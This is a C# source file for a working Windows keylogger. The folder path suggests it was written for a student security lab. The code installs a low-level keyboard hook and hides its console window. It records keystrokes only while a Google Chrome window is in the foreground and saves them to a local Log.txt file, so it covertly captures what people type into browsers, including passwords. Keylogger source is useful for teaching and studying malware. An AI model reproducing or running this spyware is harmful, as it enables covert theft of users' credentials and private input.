using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace key_log
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern int ToAsciiEx(uint uVirtKey, uint uScanCode, byte[] lpKeyState, byte[] buff, uint uFlags, IntPtr hkl);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetKeyboardLayout(uint dwLayout);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
        [DllImport("USER32.dll")]
        public static extern short GetKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flag;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int HC_ACTION = 0;
        public const int WH_KEYBOARD_LL = 13;
        public static IntPtr WM_KEYDOWN = (IntPtr)0x0100;
        public static IntPtr WM_ALT = (IntPtr)0x00000104;
        public static LowLevelKeyboardProc LogProc = HookProc;
        private static IntPtr hhook = IntPtr.Zero;
        const int SW_HIDE = 0;
        static IntPtr _hook;
        private const int VK_CAPITAL = 0x14;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            _hook = SetHook(LogProc);
            Application.Run();
            Application.ThreadExit += OnThreadExit;
        }

        private static void OnThreadExit(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(_hook);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc LogProcHere)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, LogProcHere, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            string windowName = GetCaptionOfActiveWindow();
            KBDLLHOOKSTRUCT kb = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            byte[] keyState = new byte[256];
            byte[] inBuffer = new byte[1];
            var flagState = kb.flag;
            Encoding encoding = Encoding.GetEncoding("windows-1251");

            if (windowName.Contains("Google Chrome") && nCode >= HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_ALT))
            {
                for (int i = 0; i < 256; i++)
                {
                    keyState[i] = 0;
                    if ((GetAsyncKeyState(i) & 0x8000) != 0) keyState[i] |= 0x80;
                    if ((GetKeyState(i) & 0x0001) != 0) keyState[i] |= 0x01;
                }

                var keyOptions = new KeyOptions();

                ToAsciiEx(kb.vkCode, kb.scanCode, keyState, inBuffer, flagState, GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)));
                keyOptions.EncodedChar = encoding.GetString(inBuffer);
                
                int vkCode = (int)kb.vkCode;
                int flags = (int)kb.flag;
                Keys key = (Keys)vkCode;

                if (wParam == WM_KEYDOWN || wParam == WM_ALT)
                {
                    bool isAlt = false, isControl = false, isShift = false;

                    isAlt = wParam == WM_ALT;
                    isControl = (Control.ModifierKeys & Keys.Control) != Keys.None;
                    isShift = (Control.ModifierKeys & Keys.Shift) != Keys.None;

                    if (isAlt) key |= Keys.Alt;
                    if (isControl) key |= Keys.Control;
                    if (isShift) key |= Keys.Shift;

                    keyOptions.Keys = key;
                }

                keyOptions.IsCapsLockEnable = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                SaveToContainer(keyOptions);
            }

            return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
        }

        public static string GetCaptionOfActiveWindow()
        {
            var strTitle = string.Empty;
            var handle = GetForegroundWindow();
            var intLength = GetWindowTextLength(handle) + 1;
            var stringBuilder = new StringBuilder(intLength);

            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }

            return strTitle;
        }

        private static StringBuilder messageContainer = new StringBuilder();
        public static void SaveToContainer(KeyOptions keyOptions)
        {
            var lineMessage = keyOptions.ToString();

            messageContainer.AppendLine(lineMessage);
            //Console.WriteLine(lineMessage);
            

            if (messageContainer.Length > 2000)
            {
                System.IO.File.WriteAllText("G:\\KINGSTON\\8 сем\\ЗОС\\лаб2\\Log.txt", Convert.ToString(messageContainer));
                messageContainer.Clear();
                //MessageBox.Show("SaveToFile");
            }
        }
    }
}
